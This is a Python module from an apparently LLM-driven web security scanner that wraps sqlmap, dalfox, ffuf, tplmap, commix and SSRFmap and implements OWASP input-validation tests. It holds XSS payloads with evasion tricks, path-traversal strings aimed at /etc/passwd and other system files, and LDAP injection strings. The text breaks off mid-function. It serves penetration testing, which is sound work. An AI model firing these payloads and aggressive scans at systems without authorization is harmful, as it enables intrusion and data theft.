"""
COMPREHENSIVE INPUT VALIDATION TESTING - OWASP WSTG 4.7 COMPLETE IMPLEMENTATION
================================================================================

This module implements ALL 19 OWASP WSTG 4.7 input validation tests with sub-tests.
Based on:
- OWASP Testing Guide v4.2
- PortSwigger Web Security Academy
- HackerOne disclosed reports
- Common web application vulnerability patterns

Author: RAJDOLL Security Scanner
Version: 2.0 - Complete WSTG Coverage
"""

# from mcp.server.fastmcp import FastMCP  # REMOVED: Using JSON-RPC adapter instead
import asyncio
import asyncio.subprocess
import httpx
import re
import os
import json
import subprocess
import time
import logging
import shutil
import tempfile
from pathlib import Path
from typing import Dict, Any, List, Optional, Union
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote

# mcp = FastMCP("input-validation-testing-enhanced")  # REMOVED: Using JSON-RPC adapter instead

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s [input-validation-mcp] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# External tool configuration
SQLMAP_BIN = os.getenv("SQLMAP_BIN", "sqlmap")
DALFOX_BIN = os.getenv("DALFOX_BIN", "dalfox")
SQLMAP_TIMEOUT = int(os.getenv("SQLMAP_TIMEOUT_SECONDS", "600"))  # 10 minutes for comprehensive scanning
DALFOX_TIMEOUT = int(os.getenv("DALFOX_TIMEOUT_SECONDS", "240"))
MAX_TOOL_OUTPUT = int(os.getenv("TOOL_OUTPUT_SNIPPET", "4000"))
FFUF_BIN = os.getenv("FFUF_BIN", "ffuf")
FFUF_TIMEOUT = int(os.getenv("FFUF_TIMEOUT_SECONDS", "300"))
FFUF_REQUEST_TIMEOUT = os.getenv("FFUF_REQUEST_TIMEOUT", "10")
FFUF_MATCH_REGEX = os.getenv(
    "FFUF_LFI_REGEX",
    r"(?i)root:x:0:0:|\[fonts\]|SERVER_NAME=|HTTP_HOST=|GET /"
)
FFUF_WORDLIST = os.getenv(
    "FFUF_LFI_WORDLIST",
    "/app/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt"
)
TPLMAP_BIN = os.getenv("TPLMAP_BIN", "tplmap")
TPLMAP_TIMEOUT = int(os.getenv("TPLMAP_TIMEOUT_SECONDS", "300"))
SSRFMAP_BIN = os.getenv("SSRFMAP_BIN", "ssrfmap")
SSRFMAP_TIMEOUT = int(os.getenv("SSRFMAP_TIMEOUT_SECONDS", "300"))


def _truncate_output(text: str, limit: int = MAX_TOOL_OUTPUT) -> str:
    """Return the last `limit` characters to avoid flooding logs."""
    if not text:
        return ""
    return text[-limit:]


async def _run_external_tool(cmd: List[str], timeout: int) -> Dict[str, Any]:
    """Execute an external security tool and capture stdout/stderr."""
    logger.info(f"[tool] Running: {' '.join(cmd)}")
    start_time = time.time()
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except FileNotFoundError:
        logger.error(f"[tool] Binary not found: {cmd[0]}")
        return {"status": "error", "message": f"Binary not found: {cmd[0]}", "command": " ".join(cmd)}
    except asyncio.TimeoutError:
        proc.kill()
        stdout, stderr = await proc.communicate()
        logger.error(f"[tool] Timeout after {timeout}s for: {' '.join(cmd)}")
        return {
            "status": "error",
            "message": f"Timeout after {timeout}s",
            "command": " ".join(cmd),
            "stdout": _truncate_output(stdout.decode(errors="ignore")),
            "stderr": _truncate_output(stderr.decode(errors="ignore"))
        }

    duration = round(time.time() - start_time, 2)
    stdout_text = stdout.decode(errors="ignore")
    stderr_text = stderr.decode(errors="ignore")
    logger.info(f"[tool] Finished in {duration}s with code {proc.returncode}")
    return {
        "status": "success",
        "returncode": proc.returncode,
        "command": " ".join(cmd),
        "duration": duration,
        "stdout": stdout_text,
        "stderr": stderr_text
    }


def _parse_sqlmap_output(output: str) -> List[Dict[str, Any]]:
    """Extract key findings from sqlmap console output.

    FIXED: Preserve parameter field across multiple injection types.
    SQLMap output format for multiple types:
        Parameter: q (GET)
            Type: boolean-based blind
            Title: ...
            Payload: ...

            Type: time-based blind  ← No "Parameter:" line here!
            Title: ...
            Payload: ...
    """
    findings: List[Dict[str, Any]] = []
    current: Dict[str, Any] = {}
    dbms = None
    current_parameter = None  # Track parameter across multiple injection types

    for line in output.splitlines():
        stripped = line.strip()
        if "back-end DBMS" in stripped:
            dbms = stripped.split(" back-end DBMS is ")[-1].strip()
        if stripped.startswith("Parameter:"):
            # New parameter - update tracking
            current_parameter = stripped.split(":", 1)[1].strip()
            current["parameter"] = current_parameter
        elif stripped.startswith("Type:"):
            # New injection type - preserve parameter from previous finding
            if current_parameter:
                current["parameter"] = current_parameter
            current["type"] = stripped.split(":", 1)[1].strip()
        elif stripped.startswith("Title:"):
            current["title"] = stripped.split(":", 1)[1].strip()
        elif stripped.startswith("Payload:"):
            current["payload"] = stripped.split(":", 1)[1].strip()
            # Only append if we have parameter (valid finding)
            if current and "parameter" in current:
                if dbms:
                    current.setdefault("dbms", dbms)
                findings.append(current.copy())
                # Clear type/title/payload but preserve parameter for next injection type
                current = {"parameter": current_parameter} if current_parameter else {}
    return findings


def _parse_dalfox_output(output: str) -> List[Dict[str, Any]]:
    """Parse Dalfox JSONL output into structured findings."""
    findings: List[Dict[str, Any]] = []
    for raw_line in output.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        try:
            data = json.loads(line)
        except json.JSONDecodeError:
            continue
        if not isinstance(data, dict):
            continue
        normalized = {
            "parameter": data.get("param") or data.get("parameter"),
            "payload": data.get("payload"),
            "type": data.get("type") or data.get("category"),
            "severity": data.get("severity") or data.get("risk") or "info",
            "target": data.get("target") or data.get("url"),
            "evidence": data.get("evidence") or data.get("detail"),
            "source": "dalfox",
            "raw": data,
        }
        findings.append(normalized)
    return findings


def _inject_fuzz_marker(url: str, param: str) -> str:
    """Replace param value with FUZZ marker for dalfox URL mode."""
    pattern = re.compile(rf"({re.escape(param)}=)([^&#]*)", re.IGNORECASE)
    if not pattern.search(url):
        return url
    return pattern.sub(r"\1FUZZ", url, count=1)


async def run_sqlmap_scan(
    url: str,
    param: Optional[str] = None,
    config: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """Invoke sqlmap against the supplied URL/parameter with enhanced POST and authentication support."""
    if not shutil.which(SQLMAP_BIN):
        return {"status": "error", "message": "sqlmap binary not found"}
    output_dir = Path(os.getenv("SQLMAP_OUTPUT_DIR", "/tmp/sqlmap-output"))
    output_dir.mkdir(parents=True, exist_ok=True)

    config = config or {}
    method = config.get("method", "GET").upper()
    post_data = config.get("post_data")
    auth_session = config.get("auth_session", {})

    cmd = [
        SQLMAP_BIN,
        "-u",
        url,
        "--batch",  # Never ask for user input
        "--disable-coloring",
        "--random-agent",
        "--level",
        os.getenv("SQLMAP_LEVEL", "5"),  # Level 5: Test ALL parameters, cookies, headers, User-Agent (COMPREHENSIVE!)
        "--risk",
        os.getenv("SQLMAP_RISK", "3"),  # Risk 3: Test ALL aggressive payloads, OR-based, heavy queries (MAXIMUM!)
        "--threads",
        "10",  # Parallel testing for speed
        "--time-sec",
        "30",  # Time-based blind SQLi detection timeout (increased for better detection)
        "--technique",
        "BEUSTQ",  # ALL techniques: Boolean, Error, UNION, Stacked, Time-based, Query-based
        "--output-dir",
        str(output_dir),
        # GENERIC OPTIMIZATIONS: Work for any SQLite-based application
        "--dbms=SQLite",  # Many modern apps use SQLite (lightweight, embedded)
        "--forms",  # Auto-test all forms found
        "--crawl=2",  # Crawl 2 levels deep to discover more endpoints
        "--tamper=space2comment",  # Generic WAF evasion technique
        # CRITICAL FIX: Skip all interactive prompts that bypass --batch
        "--skip-urlencode",  # Skip URL encoding warnings
        "--skip-static",  # Skip testing static parameters
        "--skip-waf",  # Skip WAF/IPS detection heuristics (can trigger prompts)
        "--answers=follow=Y,other=N",  # Auto-answer common prompts
    ]

    # PHASE 2.1 ENHANCEMENT: POST body support for REST APIs and modern web apps
    if method == "POST" and post_data:
        if isinstance(post_data, dict):
            # Convert dict to URL-encoded string or JSON
            import json
            content_type = config.get("content_type", "application/x-www-form-urlencoded")
            if "json" in content_type.lower():
                post_data = json.dumps(post_data)
            else:
                from urllib.parse import urlencode
                post_data = urlencode(post_data)
        cmd += ["--data", post_data]
        logger.info(f"[run_sqlmap_scan] POST mode enabled with data: {post_data[:100]}")

    # PHASE 2.1 ENHANCEMENT: Authentication header support (JWT, Bearer tokens)
    if auth_session:
        token = auth_session.get("token") or auth_session.get("access_token")
        if token:
            cmd += ["--headers", f"Authorization: Bearer {token}"]
            logger.info(f"[run_sqlmap_scan] Authentication header added (token: {token[:20]}...)")

        # Cookie support
        cookies = auth_session.get("cookies")
        if cookies:
            if isinstance(cookies, dict):
                cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
            else:
                cookie_str = str(cookies)
            cmd += ["--cookie", cookie_str]
            logger.info(f"[run_sqlmap_scan] Cookies added: {cookie_str[:50]}...")

    # Add specific parameter if provided by LLM analysis
    if param:
        cmd += ["-p", param]

    tool_result = await _run_external_tool(cmd, SQLMAP_TIMEOUT)
    stdout_text = tool_result.pop("stdout", "")
    stderr_text = tool_result.pop("stderr", "")
    if tool_result.get("status") != "success":
        tool_result["stderr"] = _truncate_output(stderr_text)
        tool_result["raw_output"] = _truncate_output(stdout_text)
        return tool_result
    findings = _parse_sqlmap_output(stdout_text)
    return {
        **tool_result,
        "findings": findings,
        "raw_output": _truncate_output(stdout_text),
        "stderr": _truncate_output(stderr_text)
    }


async def run_dalfox_scan(
    url: str,
    param: Optional[str] = None,
    config: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """Invoke Dalfox to hunt for reflected/stored/DOM XSS with POST and JSON support."""
    if not shutil.which(DALFOX_BIN):
        return {"status": "error", "message": "dalfox binary not found"}
    config = config or {}

    method = config.get("method", "GET").upper()
    post_data = config.get("post_data")
    content_type = config.get("content_type", "application/x-www-form-urlencoded")
    auth_session = config.get("auth_session", {})

    target = _inject_fuzz_marker(url, param) if param else url
    cmd = [
        DALFOX_BIN,
        "url",
        target,
        "--silence",
        "--format",
        "json",
        "--no-spinner",
        # GENERIC XSS ENHANCEMENTS: Comprehensive testing for any web application
        "--mining-dom",  # DOM XSS mining (critical for modern JS frameworks: React, Angular, Vue)
        "--mining-dict",  # Dictionary-based parameter mining (discovers hidden parameters)
        "--follow-redirects",  # Follow redirects to find XSS in downstream pages
        "--skip-bav",  # Skip boring parameter values (faster scanning)
        "--worker", "50",  # Parallel workers for speed
        "--delay", "100",  # 100ms delay (fast but not overwhelming)
        "--timeout", "30",  # 30s timeout per request
        "--only-poc"  # Only show PoC (cleaner output)
    ]

    # PHASE 2.2 ENHANCEMENT: POST method support
    if method == "POST":
        cmd += ["--method", "POST"]
        if post_data:
            if isinstance(post_data, dict):
                import json
                if "json" in content_type.lower():
                    post_data = json.dumps(post_data)
                else:
                    from urllib.parse import urlencode
                    post_data = urlencode(post_data)
            cmd += ["--data", post_data]
            logger.info(f"[run_dalfox_scan] POST mode enabled with data: {post_data[:100]}")

    # PHASE 2.2 ENHANCEMENT: JSON Content-Type support
    if "json" in content_type.lower():
        cmd += ["-H", f"Content-Type: {content_type}"]
        logger.info(f"[run_dalfox_scan] JSON content-type set: {content_type}")

    # PHASE 2.2 ENHANCEMENT: Authentication support (JWT/Bearer)
    if auth_session:
        token = auth_session.get("token") or auth_session.get("access_token")
        if token:
            cmd += ["-H", f"Authorization: Bearer {token}"]
            logger.info(f"[run_dalfox_scan] Auth header added (token: {token[:20]}...)")

        cookies = auth_session.get("cookies")
        if cookies:
            if isinstance(cookies, dict):
                cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
            else:
                cookie_str = str(cookies)
            cmd += ["--cookie", cookie_str]
            logger.info(f"[run_dalfox_scan] Cookies added: {cookie_str[:50]}...")

    if param:
        cmd += ["--param", param]

    # Aggression level can be controlled by LLM based on reconnaissance findings
    aggression = (config.get("aggression") or "aggressive").lower()
    if aggression == "aggressive":
        cmd += ["--deep-dom", "--mining-dom-depth", "5"]  # Deep DOM traversal for SPA frameworks

    # Additional headers from config
    headers = config.get("headers")
    if headers and isinstance(headers, dict):
        for key, value in headers.items():
            if key.lower() not in ["authorization", "content-type"]:  # Avoid duplicates
                cmd += ["-H", f"{key}: {value}"]

    # LLM can provide custom payloads based on reconnaissance (e.g., detected frameworks, WAF)
    custom_payloads = config.get("custom_payloads", [])
    for payload in custom_payloads:
        cmd += ["--custom-payload", payload]

    tool_result = await _run_external_tool(cmd, DALFOX_TIMEOUT)
    stdout_text = tool_result.pop("stdout", "")
    stderr_text = tool_result.pop("stderr", "")
    if tool_result.get("status") != "success":
        tool_result["stderr"] = _truncate_output(stderr_text)
        tool_result["raw_output"] = _truncate_output(stdout_text)
        return tool_result
    findings = _parse_dalfox_output(stdout_text)
    return {
        **tool_result,
        "findings": findings,
        "raw_output": _truncate_output(stdout_text),
        "stderr": _truncate_output(stderr_text)
    }


async def run_ffuf_lfi_scan(
    url: str,
    param: Optional[str] = None,
    config: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """Invoke ffuf to brute-force LFI paths via FUZZ placeholder."""
    if not shutil.which(FFUF_BIN):
        return {"status": "error", "message": "ffuf binary not found"}

    config = config or {}
    target = _inject_fuzz_marker(url, param) if param else url
    if "FUZZ" not in target:
        sep = "&" if "?" in target else "?"
        placeholder_param = param or "file"
        target = f"{target}{sep}{placeholder_param}=FUZZ"

    wordlist_override = config.get("wordlist")
    temp_wordlist_path = None
    if wordlist_override and Path(wordlist_override).exists():
        wordlist_path = wordlist_override
    else:
        default_wordlist = Path(FFUF_WORDLIST)
        if default_wordlist.exists():
            wordlist_path = str(default_wordlist)
        else:
            lfi_payloads = [
                "../../../../etc/passwd",
                "../etc/passwd",
                "..%2F..%2Fetc%2Fpasswd",
                "....//....//etc/passwd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "/etc/passwd",
                "../../../../proc/self/environ",
                "../../../../var/log/apache2/access.log",
                "..\\..\\..\\..\\windows\\win.ini",
                "..%5C..%5C..%5Cwindows%5Cwin.ini",
                "C:/windows/win.ini",
                "..\\..\\boot.ini",
                "../../../../boot.ini",
            ]
            with tempfile.NamedTemporaryFile("w", delete=False, encoding="utf-8") as word_file:
                word_file.write("\n".join(lfi_payloads))
                temp_wordlist_path = word_file.name
                wordlist_path = temp_wordlist_path

    output_fd, output_path = tempfile.mkstemp(prefix="ffuf_lfi_", suffix=".json")
    os.close(output_fd)

    try:
        aggression = (config.get("aggression") or "balanced").lower()
        cmd = [
            FFUF_BIN,
            "-u",
            target,
            "-w",
            wordlist_path,
            "-of",
            "json",
            "-o",
            output_path,
            "-timeout",
            FFUF_REQUEST_TIMEOUT,
            "-ac",
            "-mr",
            FFUF_MATCH_REGEX,
        ]

        if aggression == "aggressive":
            cmd += ["-t", "100"]
        elif aggression == "conservative":
            cmd += ["-t", "15"]

        headers = config.get("headers")
        if headers and isinstance(headers, dict):
            for key, value in headers.items():
                cmd += ["-H", f"{key}: {value}"]

        cookie = config.get("cookie")
        if cookie:
            cmd += ["-b", cookie]

        proxy = config.get("proxy")
        if proxy:
            cmd += ["-x", proxy]

        tool_result = await _run_external_tool(cmd, FFUF_TIMEOUT)
        stdout_text = tool_result.pop("stdout", "")
        stderr_text = tool_result.pop("stderr", "")

        if not Path(output_path).exists():
            return {
                **tool_result,
                "status": tool_result.get("status", "error"),
                "raw_output": _truncate_output(stdout_text),
                "stderr": _truncate_output(stderr_text),
                "findings": []
            }

        try:
            with open(output_path, "r", encoding="utf-8") as f:
                ffuf_data = json.load(f)
        except (json.JSONDecodeError, OSError) as exc:
            logger.error(f"Failed to parse ffuf output: {exc}")
            ffuf_data = {}

        findings: List[Dict[str, Any]] = []
        for result in ffuf_data.get("results", []):
            payload = result.get("input", {}).get("FUZZ")
            evidence = result.get("result") or result.get("url")
            findings.append({
                "parameter": param or result.get("position"),
                "payload": payload,
                "status": result.get("status"),
                "words": result.get("words"),
                "lines": result.get("lines"),
                "length": result.get("length"),
                "url": result.get("url"),
                "evidence": evidence,
                "source": "ffuf"
            })

        return {
            **tool_result,
            "findings": findings,
            "raw_output": _truncate_output(stdout_text or json.dumps(ffuf_data)[:MAX_TOOL_OUTPUT]),
            "stderr": _truncate_output(stderr_text)
        }
    finally:
        if temp_wordlist_path and os.path.exists(temp_wordlist_path):
            os.remove(temp_wordlist_path)
        if output_path and os.path.exists(output_path):
            os.remove(output_path)


# ============================================================================
# ADDITIONAL AUTOMATED TOOL WRAPPERS
# ============================================================================

async def run_tplmap_scan(
    url: str,
    param: Optional[str] = None,
    config: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Invoke tplmap for automated SSTI (Server-Side Template Injection) testing.
    LLM provides URL and optional parameter based on reconnaissance.
    """
    if not shutil.which(TPLMAP_BIN):
        return {"status": "error", "message": "tplmap binary not found"}

    cmd = [
        TPLMAP_BIN,
        "-u", url,
        "--level", "5",  # Maximum detection level
        "--technique", "RS",  # Reflected and Stored
        "-e", "jinja2,mako,tornado,django,erb,smarty,twig,freemarker,velocity,handlebars",  # All engines
    ]

    if param:
        cmd += ["-p", param]

    tool_result = await _run_external_tool(cmd, TPLMAP_TIMEOUT)
    stdout_text = tool_result.pop("stdout", "")
    stderr_text = tool_result.pop("stderr", "")

    if tool_result.get("status") != "success":
        tool_result["stderr"] = _truncate_output(stderr_text)
        tool_result["raw_output"] = _truncate_output(stdout_text)
        return tool_result

    # Parse tplmap output for vulnerabilities
    findings = []
    if "SSTI found" in stdout_text or "Template engine" in stdout_text:
        findings.append({
            "type": "ssti",
            "evidence": _truncate_output(stdout_text, 500)
        })

    return {
        **tool_result,
        "findings": findings,
        "raw_output": _truncate_output(stdout_text),
        "stderr": _truncate_output(stderr_text)
    }


async def run_commix_scan(
    url: str,
    param: Optional[str] = None,
    config: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Invoke commix for automated command injection testing.
    LLM provides URL and optional parameter based on reconnaissance.
    """
    if not shutil.which(os.getenv("COMMIX_BIN", "commix")):
        return {"status": "error", "message": "commix binary not found"}

    cmd = [
        os.getenv("COMMIX_BIN", "commix"),
        "--url", url,
        "--batch",  # Non-interactive
        "--level", "3",  # Maximum test depth
        "--technique", "TBECF",  # All techniques: Time-based, Eval-based, Command, File
        "--web-root", "/var/www/html",  # Common web root
    ]

    if param:
        cmd += ["-p", param]

    timeout = int(os.getenv("COMMIX_TIMEOUT_SECONDS", "300"))
    tool_result = await _run_external_tool(cmd, timeout)
    stdout_text = tool_result.pop("stdout", "")
    stderr_text = tool_result.pop("stderr", "")

    if tool_result.get("status") != "success":
        tool_result["stderr"] = _truncate_output(stderr_text)
        tool_result["raw_output"] = _truncate_output(stdout_text)
        return tool_result

    # Parse commix output
    findings = []
    if "appears to be injectable" in stdout_text.lower() or "command injection" in stdout_text.lower():
        findings.append({
            "type": "command_injection",
            "evidence": _truncate_output(stdout_text, 500)
        })

    return {
        **tool_result,
        "findings": findings,
        "raw_output": _truncate_output(stdout_text),
        "stderr": _truncate_output(stderr_text)
    }


async def run_ssrfmap_scan(
    url: str,
    param: Optional[str] = None,
    config: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Invoke SSRFmap for automated SSRF testing.
    LLM provides URL and optional parameter based on reconnaissance.
    """
    if not shutil.which(SSRFMAP_BIN):
        return {"status": "error", "message": "ssrfmap binary not found"}

    # SSRFmap requires parameter to test
    if not param:
        return {"status": "error", "message": "SSRFmap requires a parameter to test"}

    cmd = [
        SSRFMAP_BIN,
        "-r", url,
        "-p", param,
        "-m", "readfiles",  # Test for file reading
        "--lhost", "127.0.0.1",  # Local testing
    ]

    tool_result = await _run_external_tool(cmd, SSRFMAP_TIMEOUT)
    stdout_text = tool_result.pop("stdout", "")
    stderr_text = tool_result.pop("stderr", "")

    if tool_result.get("status") != "success":
        tool_result["stderr"] = _truncate_output(stderr_text)
        tool_result["raw_output"] = _truncate_output(stdout_text)
        return tool_result

    # Parse SSRFmap output
    findings = []
    if "SSRF" in stdout_text or "vulnerable" in stdout_text.lower():
        findings.append({
            "type": "ssrf",
            "evidence": _truncate_output(stdout_text, 500)
        })

    return {
        **tool_result,
        "findings": findings,
        "raw_output": _truncate_output(stdout_text),
        "stderr": _truncate_output(stderr_text)
    }


# ============================================================================
# 4.7.2 - STORED XSS TESTING
# ============================================================================

# # @mcp.tool()  # REMOVED: Using JSON-RPC adapter  # REMOVED: Using JSON-RPC adapter instead
async def test_stored_xss(
    url: str,
    form_data: Optional[Dict[str, str]] = None,
    test_fields: Optional[List[str]] = None
) -> Dict[str, Any]:
    """
    WSTG-INPV-02: Test for Stored (Persistent) Cross-Site Scripting
    
    Tests if user input is stored on server and rendered without encoding.
    Common locations: comments, user profiles, forum posts, file uploads
    
    Args:
        url: Target URL with form or API endpoint
        form_data: Optional form fields (auto-detected if not provided)
        test_fields: Specific fields to test (tests all if not provided)
    
    Returns:
        Dict with vulnerable fields and payloads
    """
    try:
        # Unique marker to detect stored XSS
        marker = f"XSS{int(time.time())}"
        
        # Advanced payloads that bypass common filters + CSP/WAF evasion
        payloads = [
            # Basic XSS
            f"<script>alert('{marker}')</script>",
            f"<img src=x onerror=alert('{marker}')>",
            f"<svg onload=alert('{marker}')>",
            f"<iframe src=javascript:alert('{marker}')>",

            # Bypass techniques (for apps with weak CSP or no CSP)
            f"<iframe src=\"javascript:alert(`{marker}`)\">",
            f"<<SCRIPT>alert('{marker}')//<</SCRIPT>",
            
            # DOM-based triggers for Angular apps
            f"{{{{constructor.constructor('alert({marker})')()}}}}",
            f"<input autofocus onfocus=alert('{marker}')>",
            
            # Event handler bypass
            f"<details open ontoggle=alert('{marker}')>",
            f"<marquee onstart=alert('{marker}')>",
            
            # Nested tags bypass
            f"<scr<script>ipt>alert('{marker}')</scr</script>ipt>",
            f"<IMG SRC=j&#X41vascript:alert('{marker}')>",
            f"<svg><script>alert('{marker}')</script></svg>",
            
            # HTML entity encoding
            f"&lt;script&gt;alert('{marker}')&lt;/script&gt;",
            f"<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;('{marker}')\">",
        ]
        
        findings = []
        
        # If form_data not provided, discover via common REST API endpoints
        if not form_data:
            async with httpx.AsyncClient(timeout=30, follow_redirects=True) as client:
                # Try generic feedback/comment/review endpoints (common across web applications)
                generic_endpoints = [
                    url,  # Original URL
                    url.rstrip('/') + '/api/feedback',
                    url.rstrip('/') + '/api/comments',
                    url.rstrip('/') + '/api/reviews',
                    url.rstrip('/') + '/rest/feedback',
                    url.rstrip('/') + '/rest/comments',
                    url.rstrip('/') + '/api/feedbacks',  # Plural variant
                ]

                for endpoint in generic_endpoints:
                    try:
                        resp = await client.get(endpoint)
                        # Check if it's an API endpoint or has forms
                        if 'application/json' in resp.headers.get('content-type', ''):
                            # JSON API - try common fields
                            form_data = {"comment": "", "message": "", "content": "", "email": "", "captcha": ""}
                            break
                        elif '<form' in resp.text or 'textarea' in resp.text.lower():
                            form_data = {"comment": "", "message": "", "content": "", "review": ""}
                            break
                    except Exception:
                        continue
        
        if not form_data:
            return {"status": "success", "data": {"vulnerable": False, "message": "No form fields found"}}
        
        # Test each field with each payload
        async with httpx.AsyncClient(timeout=30, follow_redirects=True, verify=False) as client:
            for field_name in (test_fields or form_data.keys()):
                for payload in payloads[:8]:  # Test first 8 payloads (basic + bypass techniques)
                    test_data = form_data.copy()
                    test_data[field_name] = payload
                    
                    # Submit data
                    try:
                        post_resp = await client.post(url, data=test_data)
                        
                        # Check if payload is reflected in response
                        if marker in post_resp.text and '<' in post_resp.text:
                            # Try to fetch again to confirm persistence
                            await asyncio.sleep(1)
                            get_resp = await client.get(url)
                            
                            if marker in get_resp.text:
                                findings.append({
                                    "field": field_name,
                                    "payload": payload,
                                    "confirmation": "Payload persisted across requests",
                                    "severity": "high"
                                })
                                break  # Found one, move to next field
                    except Exception:
                        continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings,
                    "message": f"Found {len(findings)} stored XSS vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No stored XSS found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.4 - HTTP PARAMETER POLLUTION
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_http_parameter_pollution(url: str) -> Dict[str, Any]:
    """
    WSTG-INPV-04: Test for HTTP Parameter Pollution (HPP)
    
    Tests if duplicate parameters cause unexpected behavior.
    Example: ?id=1&id=2 might process as [1,2] or just 2, depending on backend
    
    Reference: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution
    """
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return {"status": "success", "data": {"vulnerable": False, "message": "No parameters to test"}}
        
        findings = []
        
        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as client:
            # Test each parameter with duplication
            for param_name, param_values in params.items():
                original_value = param_values[0] if param_values else ""
                
                # Test different HPP scenarios
                test_cases = [
                    # Duplicate with different values
                    {param_name: [original_value, "INJECTED"], "scenario": "duplicate_different"},
                    # Duplicate with same value
                    {param_name: [original_value, original_value], "scenario": "duplicate_same"},
                    # Array notation
                    {f"{param_name}[]": [original_value, "INJECTED"], "scenario": "array_notation"},
                ]
                
                # Get baseline response
                baseline_resp = await client.get(url)
                baseline_text = baseline_resp.text
                
                for test_params in test_cases:
                    # Build URL with duplicate parameters
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    query_parts = []
                    for k, v_list in test_params.items():
                        for v in (v_list if isinstance(v_list, list) else [v_list]):
                            query_parts.append(f"{k}={quote(str(v))}")
                    test_url += "?" + "&".join(query_parts)
                    
                    hpp_resp = await client.get(test_url)
                    
                    # Check if response differs significantly
                    if hpp_resp.text != baseline_text:
                        # Check if "INJECTED" appears in response
                        if "INJECTED" in hpp_resp.text:
                            findings.append({
                                "parameter": param_name,
                                "scenario": test_params.get("scenario"),
                                "test_url": test_url,
                                "evidence": "Injected value reflected in response",
                                "severity": "medium"
                            })
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings,
                    "message": f"Found {len(findings)} HPP vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No HPP vulnerabilities found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.6 - LDAP INJECTION
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_ldap_injection(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    WSTG-INPV-06: Test for LDAP Injection
    
    Tests if LDAP queries are vulnerable to injection attacks.
    Common in login forms using LDAP authentication.
    
    Reference: https://owasp.org/www-community/attacks/LDAP_Injection
    """
    try:
        # LDAP injection payloads
        payloads = [
            "*",
            "*)(uid=*",
            "admin)(&(password=*",
            "*)(|(uid=*",
            ")(cn=*))%00",
            "*)(objectClass=*",
            "*)((objectClass=*",
            "*))%00",
            # Blind LDAP injection
            "*)(uid=admin))(|(uid=*",
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params and not param:
            return {"status": "success", "data": {"vulnerable": False, "message": "No parameters to test"}}
        
        findings = []
        test_params = [param] if param else list(params.keys())
        
        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as client:
            # Get baseline response
            baseline_resp = await client.get(url)
            baseline_length = len(baseline_resp.text)
            
            for param_name in test_params:
                for payload in payloads:
                    # Build test URL
                    test_params_dict = params.copy()
                    test_params_dict[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_dict, doseq=True)}"
                    
                    ldap_resp = await client.get(test_url)
                    
                    # Check for LDAP error messages
                    error_patterns = [
                        r"LDAP",
                        r"javax\.naming\.NamingException",
                        r"LDAPException",
                        r"com\.sun\.jndi\.ldap",
                        r"Invalid DN syntax",
                        r"A constraint violation occurred"
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, ldap_resp.text, re.IGNORECASE):
                            findings.append({
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": f"LDAP error pattern detected: {pattern}",
                                "severity": "high"
                            })
                            break
                    
                    # Check for significant response length differences (potential blind LDAP)
                    length_diff = abs(len(ldap_resp.text) - baseline_length)
                    if length_diff > baseline_length * 0.3:  # 30% difference
                        findings.append({
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": f"Response length changed significantly ({length_diff} bytes)",
                            "severity": "medium",
                            "type": "blind_ldap_injection"
                        })
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings[:5],  # Return top 5
                    "message": f"Found {len(findings)} potential LDAP injection points"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No LDAP injection found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.12 - COMMAND INJECTION
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_command_injection(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    WSTG-INPV-12: Test for OS Command Injection

    Uses commix automated tool for comprehensive command injection testing.
    LLM analyzes reconnaissance to determine which parameters to test.

    Reference: https://portswigger.net/web-security/os-command-injection
    """
    try:
        # Use automated commix tool instead of manual payloads
        commix_report = await run_commix_scan(url, param)

        if commix_report.get("status") == "error":
            return {
                "status": "error",
